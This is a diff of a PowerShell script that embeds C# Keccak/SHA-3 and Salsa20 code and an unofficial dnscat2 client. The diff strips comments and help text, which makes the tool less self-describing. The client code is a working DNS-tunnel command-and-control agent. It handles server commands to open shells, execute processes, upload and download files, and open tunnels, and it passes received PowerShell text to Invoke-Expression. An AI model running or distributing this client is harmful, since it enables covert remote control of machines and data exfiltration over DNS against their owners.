@@ -14,12 +14,6 @@ using Org.BouncyCastle.Utilities;
 
 namespace Org.BouncyCastle.Crypto.Digests
 {
-    /// <summary>
-    /// Implementation of Keccak based on following KeccakNISTInterface.c from http://keccak.noekeon.org/
-    /// </summary>
-    /// <remarks>
-    /// Following the naming conventions used in the C source code to enable easy review of the implementation.
-    /// </remarks>
     public class KeccakDigest
     {
         private static readonly ulong[] KeccakRoundConstants = KeccakInitializeRoundConstants();
@@ -159,9 +153,7 @@ namespace Org.BouncyCastle.Crypto.Digests
             return GetDigestSize();
         }
 
-        /*
-         * TODO Possible API change to support partial-byte suffixes.
-         */
+        
         protected virtual int DoFinal(byte[] output, int outOff, byte partialByte, int partialBits)
         {
             if (partialBits > 0)
@@ -182,11 +174,6 @@ namespace Org.BouncyCastle.Crypto.Digests
             Init(fixedOutputLength);
         }
 
-        /**
-         * Return the size of block that the compression function is applied to in bytes.
-         *
-         * @return internal byte length of a block.
-         */
         public virtual int GetByteLength()
         {
             return rate / 8;
@@ -231,8 +218,6 @@ namespace Org.BouncyCastle.Crypto.Digests
             }
 
             this.rate = rate;
-            // this is never read, need to check to see why we want to save it
-            //  this.capacity = capacity;
             this.fixedOutputLength = 0;
             Arrays.Fill(this.state, (byte)0);
             Arrays.Fill(this.dataQueue, (byte)0);
@@ -527,29 +512,11 @@ namespace Org.BouncyCastle.Crypto.Digests
         {
             Array.Copy(byteState, 0, data, 0, laneCount * 8);
         }
-
-        // public virtual IMemoable Copy()
-        // {
-        //     return new KeccakDigest(this);
-        // }
-
-        // public virtual void Reset(IMemoable other)
-        // {
-        //     KeccakDigest d = (KeccakDigest)other;
-
-        //     CopyIn(d);
-        // }
     }
 }
 
 namespace Org.BouncyCastle.Crypto.Digests
 {
-    /// <summary>
-    /// Implementation of SHA-3 based on following KeccakNISTInterface.c from http://keccak.noekeon.org/
-    /// </summary>
-    /// <remarks>
-    /// Following the naming conventions used in the C source code to enable easy review of the implementation.
-    /// </remarks>
     public class Sha3Digest
         : KeccakDigest
     {
@@ -594,9 +561,7 @@ namespace Org.BouncyCastle.Crypto.Digests
             return base.DoFinal(output,  outOff);
         }
 
-        /*
-         * TODO Possible API change to support partial-byte suffixes.
-         */
+        
         protected override int DoFinal(byte[] output, int outOff, byte partialByte, int partialBits)
         {
             if (partialBits < 0 || partialBits > 7)
@@ -622,7 +587,6 @@ namespace Org.BouncyCastle.Crypto.Digests
 
 namespace Org.BouncyCastle.Utilities
 {
-    /// <summary> General array utilities.</summary>
     public abstract class Arrays
     {
         public static byte[] Clone(
@@ -648,16 +612,6 @@ namespace Org.BouncyCastle.Utilities
 Add-type -TypeDefinition $source -Language CSharp
 
 $source = @"
-/*
- * This implementation of Salsa20 is ported from the reference implementation
- * by D. J. Bernstein, which can be found at:
- *   http://cr.yp.to/snuffle/salsa20/ref/salsa20.c
- *
- * This work is hereby released into the Public Domain. To view a copy of the public domain dedication,
- * visit http://creativecommons.org/licenses/publicdomain/ or send a letter to
- * Creative Commons, 171 Second Street, Suite 300, San Francisco, California, 94105, USA.
- */
-
 using System;
 using System.Diagnostics;
 using System.Security.Cryptography;
@@ -665,16 +619,9 @@ using System.Text;
 
 namespace Logos.Utility.Security.Cryptography
 {
-	/// <summary>
-	/// Implements the Salsa20 stream encryption cipher, as defined at http://cr.yp.to/snuffle.html.
-	/// </summary>
-	/// <remarks>See <a href="http://code.logos.com/blog/2008/06/salsa20_implementation_in_c_1.html">Salsa20 Implementation in C#</a>.</remarks>
+	
 	public sealed class Salsa20 : SymmetricAlgorithm
 	{
-		/// <summary>
-		/// Initializes a new instance of the <see cref="Salsa20"/> class.
-		/// </summary>
-		/// <exception cref="CryptographicException">The implementation of the class derived from the symmetric algorithm is not valid.</exception>
 		public Salsa20()
 		{
 			// set legal values
@@ -687,26 +634,14 @@ namespace Logos.Utility.Security.Cryptography
 			m_rounds = 20;
 		}
 
-		/// <summary>
-		/// Creates a symmetric decryptor object with the specified <see cref="SymmetricAlgorithm.Key"/> property
-		/// and initialization vector (<see cref="SymmetricAlgorithm.IV"/>).
-		/// </summary>
-		/// <param name="rgbKey">The secret key to use for the symmetric algorithm.</param>
-		/// <param name="rgbIV">The initialization vector to use for the symmetric algorithm.</param>
-		/// <returns>A symmetric decryptor object.</returns>
+		
 		public override ICryptoTransform CreateDecryptor(byte[] rgbKey, byte[] rgbIV)
 		{
 			// decryption and encryption are symmetrical
 			return CreateEncryptor(rgbKey, rgbIV);
 		}
 
-		/// <summary>
-		/// Creates a symmetric encryptor object with the specified <see cref="SymmetricAlgorithm.Key"/> property
-		/// and initialization vector (<see cref="SymmetricAlgorithm.IV"/>).
-		/// </summary>
-		/// <param name="rgbKey">The secret key to use for the symmetric algorithm.</param>
-		/// <param name="rgbIV">The initialization vector to use for the symmetric algorithm.</param>
-		/// <returns>A symmetric encryptor object.</returns>
+		
 		public override ICryptoTransform CreateEncryptor(byte[] rgbKey, byte[] rgbIV)
 		{
 			if (rgbKey == null)
@@ -718,30 +653,21 @@ namespace Logos.Utility.Security.Cryptography
 			return new Salsa20CryptoTransform(rgbKey, rgbIV, m_rounds);
 		}
 
-		/// <summary>
-		/// Generates a random initialization vector (<see cref="SymmetricAlgorithm.IV"/>) to use for the algorithm.
-		/// </summary>
+		
 		public override void GenerateIV()
 		{
 			// generate a random 8-byte IV
 			IVValue = GetRandomBytes(8);
 		}
 
-		/// <summary>
-		/// Generates a random key (<see cref="SymmetricAlgorithm.Key"/>) to use for the algorithm.
-		/// </summary>
+		
 		public override void GenerateKey()
 		{
 			// generate a random key
 			KeyValue = GetRandomBytes(KeySize / 8);
 		}
 
-		/// <summary>
-		/// Gets or sets the initialization vector (<see cref="SymmetricAlgorithm.IV"/>) for the symmetric algorithm.
-		/// </summary>
-		/// <value>The initialization vector.</value>
-		/// <exception cref="ArgumentNullException">An attempt was made to set the initialization vector to null. </exception>
-		/// <exception cref="CryptographicException">An attempt was made to set the initialization vector to an invalid size. </exception>
+		
 		public override byte[] IV
 		{
 			get
@@ -755,10 +681,7 @@ namespace Logos.Utility.Security.Cryptography
 			}
 		}
 
-		/// <summary>
-		/// Gets or sets the number of rounds used by the Salsa20 algorithm.
-		/// </summary>
-		/// <value>The number of rounds.</value>
+		
 		public int Rounds
 		{
 			get
@@ -773,7 +696,7 @@ namespace Logos.Utility.Security.Cryptography
 			}
 		}
 
-		// Verifies that iv is a legal value for a Salsa20 IV.
+		
 		private static void CheckValidIV(byte[] iv, string paramName)
 		{
 			if (iv == null)
@@ -782,11 +705,9 @@ namespace Logos.Utility.Security.Cryptography
 				throw new CryptographicException("Invalid IV size; it must be 8 bytes.");
 		}
 
-		// Returns a new byte array containing the specified number of random bytes.
 		private static byte[] GetRandomBytes(int byteCount)
 		{
 			byte[] bytes = new byte[byteCount];
-			//using (RandomNumberGenerator rng = new RNGCryptoServiceProvider())
             RandomNumberGenerator rng = new RNGCryptoServiceProvider();
 		    rng.GetBytes(bytes);
 			return bytes;
@@ -794,9 +715,6 @@ namespace Logos.Utility.Security.Cryptography
 
 		int m_rounds;
 
-		/// <summary>
-		/// Salsa20Impl is an implementation of <see cref="ICryptoTransform"/> that uses the Salsa20 algorithm.
-		/// </summary>
 		private sealed class Salsa20CryptoTransform : ICryptoTransform
 		{
 			public Salsa20CryptoTransform(byte[] key, byte[] iv, int rounds)
@@ -831,7 +749,6 @@ namespace Logos.Utility.Security.Cryptography
 
 			public int TransformBlock(byte[] inputBuffer, int inputOffset, int inputCount, byte[] outputBuffer, int outputOffset)
 			{
-				// check arguments
 				if (inputBuffer == null)
 					throw new ArgumentNullException("inputBuffer");
 				if (inputOffset < 0 || inputOffset >= inputBuffer.Length)
@@ -854,7 +771,6 @@ namespace Logos.Utility.Security.Cryptography
 					m_state[8] = AddOne(m_state[8]);
 					if (m_state[8] == 0)
 					{
-						// NOTE: stopping at 2^70 bytes per nonce is user's responsibility
 						m_state[9] = AddOne(m_state[9]);
 					}
 
@@ -1227,23 +1143,19 @@ function Send-Dnscat2Packet ($Packet, $Domain, $DNSServer, $DNSPort, $LookupType
             $Done = $True
             [byte[]]$Data = @()
 
-            # Extract and sort the IPs
             $regex = [regex] "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"
             $IPs = ($regex.Matches($result.Substring($result.IndexOf("Name"))) | %{ $_.value }) | sort {"{0:d3}.{1:d3}.{2:d3}.{3:d3}" -f @([int[]]$_.split('.'))}
 
-            # First response is different, it has a length field
             $PacketLength = [Convert]::ToUInt16($IPs[0].split(".")[1])
             $IPs[0].split(".")[2..3] | % { $Data += [Convert]::ToUInt16($_) }
             $IPs = $IPs[1..$IPs.Count]
 
-            # Strip the sequence numbers out of the other packets
             if ($IPs.Count -gt 0) {
                 foreach ($IP in $IPs) {
                     $IP.split(".")[1..3] | % { $Data += [Convert]::ToUInt16($_) }
                 }
             }
 
-            # Return result as hex and strip out the padding
             $result = Convert-BytesToHex $Data[0..($PacketLength - 1)]
         }
     } elseif ($LookupType -eq "AAAA") {
@@ -1251,12 +1163,10 @@ function Send-Dnscat2Packet ($Packet, $Domain, $DNSServer, $DNSPort, $LookupType
             $Done = $True
             $Data = ""
 
-            # Extract the IPs
             $regex = [regex] "(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))"
             $IPs = @()
             $IPs += ($regex.Matches($result.Substring($result.IndexOf("Name"))) | % { if ($_.value -ne "::") {$_.value} } )
 
-            # Expand the IPv6 address
             for ($i = 0; $i -lt $IPs.Count; $i++) {
                 [byte[]]$ipbytes = ([Net.IPAddress]$IPs[$i]).GetAddressBytes();
                 $bldr = New-Object System.Text.StringBuilder
@@ -1267,22 +1177,18 @@ function Send-Dnscat2Packet ($Packet, $Domain, $DNSServer, $DNSPort, $LookupType
                 $IPs[$i] = $bldr.ToString()
             }
 
-            # Sort
             $IPs = $IPs | sort
 
-            # First response is different, it has a length field
             $PacketLength = [Convert]::ToUInt16($IPs[0].Substring(2,2),16)
-            $Data += $IPs[0].replace(":","").Substring(4) # Strip length and seq from start
+            $Data += $IPs[0].replace(":","").Substring(4) 
 
-            # Grab data from responses after the first
             $IPs = $IPs[1..$IPs.Count]
             if ($IPs.Count -gt 0) {
                 foreach ($IP in $IPs) {
-                    $Data += $IP.replace(":","").Substring(2) # Strip seq from start
+                    $Data += $IP.replace(":","").Substring(2) 
                 }
             }
 
-            # Return result as hex and strip out the padding
             $result = $Data.Substring(0, $PacketLength*2)
         }
     }
@@ -1318,7 +1224,6 @@ function ConvertTo-Dnscat2Packet ($RawPacket) {
                 # Name
                 $Packet["Name"] = ($RawPacket[18..$RawPacket.Length] -join "")
             } elseif ($Packet["Options"] -eq 32) {
-                # Command
             }
           }
         "01" {
@@ -1337,12 +1242,12 @@ function ConvertTo-Dnscat2Packet ($RawPacket) {
             $Packet["Subtype"] = ($RawPacket[10..13] -join "")
             $Packet["Flags"] = ($RawPacket[14..17] -join "")
             $Keys = ($RawPacket[18..$RawPacket.Length] -join "")
-            if ($Subtype -eq "0000") { # ENC_SUBTYPE_INIT
+            if ($Subtype -eq "0000") { 
                 $Packet["server_pubkey_x"] += [Convert]::ToString($Keys[0..63] -join "")
                 $Packet["server_pubkey_y"] += [Convert]::ToString($Keys[64..$Keys.Length] -join "")
                 Write-Verbose ("server_pubkey_x: " + $Packet["server_pubkey_x"])
                 Write-Verbose ("server_pubkey_y: " + $Packet["server_pubkey_y"])
-            } else { # ENC_SUBTYPE_INIT
+            } else { 
                 $Packet["authenticator"] = $Keys
             }
           }
@@ -1365,14 +1270,13 @@ function Start-Dnscat2EncInit ($Session, $Renegotiate) {
     $Session["EncryptionKeys"]["client_pubkey_x"] = (Convert-BytesToHex $ECKeyPair.Public.Q.X.ToBigInteger().ToByteArrayUnsigned())
     $Session["EncryptionKeys"]["client_pubkey_y"] = (Convert-BytesToHex $ECKeyPair.Public.Q.Y.ToBigInteger().ToByteArrayUnsigned())
 
-    $Subtype = "0000" # ENC_SUBTYPE_INIT
+    $Subtype = "0000" 
     $Flags = "0000"
     Write-Verbose ("client_pubkey: " + ($Session["EncryptionKeys"]["client_pubkey"]))
     $EncPacket = (New-Dnscat2ENC $Session["Domain"] $Session["SessionId"] $Subtype $Flags $Session["EncryptionKeys"]["client_pubkey"] $Session["MaxMSGDataSize"])
 
     try {
         $Packet = 1
-        # If we are renegotiating, encrypt the packet
         $Packet = ConvertTo-Dnscat2Packet (Send-Dnscat2Packet $EncPacket $Session["Domain"] $Session["DNSServer"] $Session["DNSPort"] $Session["LookupTypes"] $Renegotiate $OldEncryptionKeys)
     } catch {}
 
@@ -1399,7 +1303,7 @@ function Start-Dnscat2EncInit ($Session, $Renegotiate) {
 }
 
 function Start-Dnscat2EncAuth ($Session) {
-    $Subtype = "0001" # ENC_SUBTYPE_AUTH
+    $Subtype = "0001" 
     $Flags = "0001"
 
     $EncPacket = (New-Dnscat2ENC $Session["Domain"] $Session["SessionId"] $Subtype $Flags (Get-NextDnscat2Data (Convert-BytesToHex $Session["EncryptionKeys"]["client_auth"]) $Session["MaxMSGDataSize"]))
@@ -1568,7 +1472,6 @@ function Read-FromDnscat2Tunnel ($Session, $TunnelId) {
         $Data = $Session["Tunnels"][$TunnelId]["StreamDestinationBuffer"][0..([int]($Session["Tunnels"][$TunnelId]["StreamBytesRead"])-1)]
         $Session["Tunnels"][$TunnelId]["StreamReadOperation"] = $Session["Tunnels"][$TunnelId]["Stream"].BeginRead($Session["Tunnels"][$TunnelId]["StreamDestinationBuffer"], 0, $Session["Tunnels"][$TunnelId]["BufferSize"], $null, $null)
 
-        # Queue tunnel packets
         $Data = Convert-BytesToHex $Data
         $PacketId = (New-RandomDNSField 4)
         $PacketId = ([Convert]::ToString(([convert]::ToUInt16($PacketId, 16) -band ( -bnot [uint16]([Math]::Floor(1 * [Math]::Pow(2,15))))),16)).PadLeft(4, '0')
@@ -1601,11 +1504,8 @@ function Update-Dnscat2CommandSession ($Session) {
         return $Session
     }
 
-    ## PROCESS COMMAND PACKETS
     while ($Session["CommandPacketBuffer"].Length -gt 0) {
-        # Packet Header
         if (($Session["RemainingBytes"] -eq 0) -and ($Session["CommandPacketBuffer"].Length -ge 16)) {
-            # Decode Command Packet Header
             $Session["Length"] = [Convert]::ToUInt32($Session["CommandPacketBuffer"][0..7] -join '', 16)
             $Session["PacketId"] = $Session["CommandPacketBuffer"][8..11] -join ''
             $Session["PacketIdBF"] = [Convert]::ToString(([convert]::ToUInt16($Session["CommandPacketBuffer"][8..11] -join '', 16) -bxor ([Math]::Floor(1 * [Math]::Pow(2,15)))),16)
@@ -1615,15 +1515,11 @@ function Update-Dnscat2CommandSession ($Session) {
             $Session["CommandFields"] = ""
         } elseif ($Session["RemainingBytes"] -gt 0) { # Packet Data
             if ($Session.RemainingBytes*2 -ge $Session["CommandPacketBuffer"].Length) {
-                # length of remaining command packet is -ge remaining data buffer
-                # We can just grab the rest of the packet buffer
                 $Session["CommandFields"] += $Session["CommandPacketBuffer"]
                 $Session["CommandFieldsBytes"] += Convert-HexToBytes $Session["CommandPacketBuffer"]
                 $Session["RemainingBytes"] -= $Session["CommandPacketBuffer"].Length/2
                 $Session["CommandPacketBuffer"] = ""
             } else {
-                # length of remaining command packet is -lt remaining data buffer
-                # We have another packet header in the buffer!
                 $Session["CommandFields"] += $Session["CommandPacketBuffer"].Substring(0, $Session.RemainingBytes*2)
                 $Session["CommandFieldsBytes"] += Convert-HexToBytes $Session["CommandPacketBuffer"].Substring(0, $Session.RemainingBytes*2)
                 $RemainingBytes = $Session.RemainingBytes*2
@@ -1635,24 +1531,21 @@ function Update-Dnscat2CommandSession ($Session) {
                 break
             }
         } else {
-            # Happens when a piece of a packet header remains in the buffer
-            # We should wait until the whole header is in the buffer before processing
             break
         }
     }
 
-    ## INVOKE COMMAND PACKET
     if ($Session["RemainingBytes"] -eq 0) {
         switch ($Session["CommandId"])
         {
-            "0000" # COMMAND_PING
+            "0000" 
             {
                 $PacketLengthField = ([Convert]::ToString((4 + $Session["CommandFields"].Length/2),16)).PadLeft(8, '0')
                 $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0000" + $Session["CommandFields"])
                 $Session["DriverDataQueue"] += $DriverData
                 return $Session
             }
-            "0001" # COMMAND_SHELL
+            "0001" 
             {
                 try {
                     $NewSessionName = $Session["CommandFields"]
@@ -1670,7 +1563,7 @@ function Update-Dnscat2CommandSession ($Session) {
                 }
                 return $Session
             }
-            "0002" # COMMAND_EXEC
+            "0002" 
             {
                 try {
                     $NewSessionName = $Session["CommandFields"].Substring(0,$Session["CommandFields"].IndexOf("00"))
@@ -1696,7 +1589,7 @@ function Update-Dnscat2CommandSession ($Session) {
                 }
                 return $Session
             }
-            "0003" # COMMAND_DOWNLOAD
+            "0003" 
             {
                 try {
                     $FileName = Convert-HexToString $Session["CommandFields"].TrimEnd('00')
@@ -1721,7 +1614,7 @@ function Update-Dnscat2CommandSession ($Session) {
                     $Session["DriverDataQueue"] += $DriverData
                 }
             }
-            "0004" # COMMAND_UPLOAD
+            "0004" 
             {
                 try {
                     $Data = $Session["CommandFields"]
@@ -1746,7 +1639,7 @@ function Update-Dnscat2CommandSession ($Session) {
                     $Session["DriverDataQueue"] += $DriverData
                 }
             }
-            "0006" # COMMAND_DELAY
+            "0006"
             {
                 try {
                     $Session["Delay"] = [Convert]::ToUInt32($Session["CommandFields"], 16)
@@ -1754,7 +1647,7 @@ function Update-Dnscat2CommandSession ($Session) {
                 } catch {}
 
             }
-            "1000" # TUNNEL_CONNECT
+            "1000"
             {
                 try {
                     $Tunnel = New-Object System.Collections.Hashtable
@@ -1763,7 +1656,6 @@ function Update-Dnscat2CommandSession ($Session) {
                     $Tunnel.Add("TunnelId", (New-RandomDNSField 8))
                     $Session["Tunnels"].Add($Tunnel.TunnelId, $Tunnel)
 
-                    ## START UP TUNNEL
                     $Session = New-Dnscat2Tunnel $Session $Tunnel.TunnelId
 
                     if ($Session["Tunnels"][$Tunnel.TunnelId].Dead) {
@@ -1784,7 +1676,7 @@ function Update-Dnscat2CommandSession ($Session) {
                     $Session["DriverDataQueue"] += $DriverData
                 }
             }
-            "1001" # TUNNEL_DATA
+            "1001" 
             {
                 try {
                     $TunnelId = $Session["CommandFields"].Substring(0, 8)
@@ -1792,7 +1684,7 @@ function Update-Dnscat2CommandSession ($Session) {
                     $Session = Send-ToDnscat2Tunnel $Session $TunnelId $Data
                 } catch { }
             }
-            "1002" # TUNNEL_CLOSE
+            "1002" 
             {
                 try {
                     $TunnelId = $Session["CommandFields"]
@@ -1815,9 +1707,7 @@ function Read-DataFromDriver ($Session) {
         return $Session
     } elseif ($Session["Driver"] -eq "command") {
 
-        # Tunnels are the only time a command session sends data without a prior request
         if ($Session["Tunnels"].Count -gt 0) {
-            # Update Tunnels
             $TunnelIds = @()
             $TunnelIds += $Session["Tunnels"].Keys
             foreach ($TunnelId in $TunnelIds) {
@@ -1828,7 +1718,6 @@ function Read-DataFromDriver ($Session) {
                 }
             }
 
-            # Remove Dead Tunnels
             foreach ($TunnelId in $Session["DeadTunnels"]) {
                 $Session["Tunnels"].Remove($TunnelId)
             }
@@ -1865,7 +1754,6 @@ function Send-DataToDriver ($Data, $Session) {
         $StringData = Convert-HexToString $Data
         ($Session["Process"]).StandardInput.WriteLine($StringData.TrimEnd("`r").TrimEnd("`n"))
     } elseif ($Session["Driver"] -eq "PS") {
-        # Only execute when a newline is sent
         $Session["PSCommand"] += $Data
         if (($Session["PSCommand"][-1..-2] -join '') -eq 'A0') {
             $Session["PSCommandReady"] = $True
@@ -1885,7 +1773,6 @@ function Stop-Dnscat2Session ($Session) {
 
 function Update-Dnscat2Session ($Session) {
     try {
-        # Retrive Driver Data
         $Session = Read-DataFromDriver $Session
 
         if ($Session["Encryption"]) {
@@ -1901,10 +1788,8 @@ function Update-Dnscat2Session ($Session) {
             return $Session
         }
 
-        # Grab next data in the queue
         $PacketData = (Get-NextDnscat2Data $Session["DriverDataQueue"] $Session["MaxMSGDataSize"])
 
-        # Delay
         $RandomDelay = $Session['MaxRandomDelay']
         if ($Session['MaxRandomDelay'] -le 0) { $RandomDelay = 0 }
         Sleep -Milliseconds ($Session['Delay'] + $RandomDelay)
@@ -1922,15 +1807,12 @@ function Update-Dnscat2Session ($Session) {
             $Packet = (ConvertTo-Dnscat2Packet $Packet)
             if($Packet -eq 1){ Write-Error "Dnscat2: Failed to ConvertTo-Dnscat2Packet..."; $Session.Dead = $True }
             if ($Packet["MessageType"] -eq "01") {
-                # Check if server ACKed sent data
                 $BytesACKed = (Compare-SequenceNumber $Session["SequenceNumber"] $Packet["AcknowledgementNumber"])
                 if ($BytesACKed -ne 0) {
-                    # If data was ACKed, remove it from Queue
                     $Session["DriverDataQueue"] = ($Session["DriverDataQueue"]).Substring($BytesACKed*2)
                 }
                 $Session["SequenceNumber"] = $Packet["AcknowledgementNumber"]
 
-                # ACK the server data
                 if ($Packet["Data"] -ne "") {
                     $Session["AcknowledgementNumber"] = Update-Dnscat2ACK $Packet["Data"] $Packet["SequenceNumber"]
                     $Session = Send-DataToDriver $Packet["Data"] $Session
@@ -1956,55 +1838,6 @@ function Update-Dnscat2Session ($Session) {
 }
 
 function Start-Dnscat2 {
-    <#
-    .SYNOPSIS
-        Start a Dnscat2 session. By default, a command type session is created.
-
-    .DESCRIPTION
-        This powershell script is an unofficial client for the dnscat2 DNS tunnel.
-
-    .PARAMETER Domain
-        The Domain being used by the dnscat2 server.
-
-    .PARAMETER DNSServer
-        The hostname or IP Address to send DNS queries to.
-
-    .PARAMETER DNSPort
-        The port to send DNS queries to.
-
-    .PARAMETER Exec
-        Link the I/O of a process with the Dnscat2 session.
-
-    .PARAMETER Console
-        Link the I/O of the console with the Dnscat2 session.
-
-    .PARAMETER ExecPS
-        Simulate a Powershell session and link the IO with the Dnscat2 session.
-        WARNING: Exiting will kill the entire dnscat2 client, not just the session.
-
-    .PARAMETER PreSharedSecret
-        Set the shared secret. Set the same one on the server and the client to prevent man-in-the-middle attacks!
-
-    .PARAMETER NoEncryption
-        Do not enable encryption.
-
-    .PARAMETER LookupTypes
-        Set an array of lookup types. Each packet has its lookup type randomly selected from the array.
-        Only TXT, MX, CNAME, A, and AAAA records are supported. Default: @(TXT, MX, CNAME)
-
-    .PARAMETER Delay
-        Set a delay between each request, in milliseconds. (Default: 0)
-
-    .PARAMETER MaxRandomDelay
-        Set the max value of a random delay added to the normal delay, in milliseconds. (Default: 0)
-
-    .PARAMETER MaxPacketSize
-        Maximum length of a dnscat2 packet.
-
-    .PARAMETER Name
-        The name of your dnscat2 session. (Default: hostname)
-    #>
-
     [CmdletBinding()]
     param(
         [Parameter(Mandatory=$True)][Alias("d")][string]$Domain,
@@ -2043,8 +1876,7 @@ function Start-Dnscat2 {
         }
     }
 
-    $SYNOptions = 1 # Enable OPT_NAME to name the session
-
+    $SYNOptions = 1 
     if ($Exec -ne '') {
         $Driver = 'exec'
         $DriverOptions = $Exec
@@ -2061,7 +1893,7 @@ function Start-Dnscat2 {
 	}
 
     if (!$NoEncryption) {
-        #$SYNOptions += 0x40
+       
     }
 
     $SYNOptions = [Convert]::ToString($SYNOptions, 16).PadLeft(4, '0')
@@ -2081,26 +1913,22 @@ function Start-Dnscat2 {
 
     try {
         while ($Sessions.Count -gt 0) {
-            # Remove Dead Sessions
             foreach ($SessionId in $DeadSessions) {
                 $Sessions.Remove($SessionId)
             }
             $DeadSessions = @()
 
-            # Update Sessions
             $SessionIds = @()
             $SessionIds += $Sessions.Keys
             foreach ($SessionId in $SessionIds) {
                 $Sessions[$SessionId] = Update-Dnscat2Session $Sessions[$SessionId]
 
-                # Execute PS commands here for access to full scope
                 if ($Sessions[$SessionId]["PSCommandReady"]) {
                     try { $Sessions[$SessionId]["DriverDataQueue"] += (Convert-StringToHex (Invoke-Expression (Convert-HexToString $Sessions[$SessionId]["PSCommand"]) | Out-String)) } catch { }
                     $Sessions[$SessionId]["PSCommand"] = ""
                     $Sessions[$SessionId]["PSCommandReady"] = $False
                 }
 
-                # Execute PS uploads here for access to full scope
                 if ($Sessions[$SessionId]["PSUploadReady"]) {
                     try { Set-Variable -Name $Sessions[$SessionId]["PSUploadName"] -Value $Sessions[$SessionId]["PSUploadValue"] } catch { }
                     $Sessions[$SessionId]["PSUploadReady"] = $False
@@ -2108,7 +1936,6 @@ function Start-Dnscat2 {
                     $Sessions[$SessionId]["PSUploadValue"] = ""
                 }
 
-                # Execute PS downloads here for access to full scope
                 if ($Sessions[$SessionId]["PSDownloadReady"]) {
                     try {
                         $VarValue = (Get-Variable -Name $Sessions[$SessionId]["PSDownloadName"] -ValueOnly)
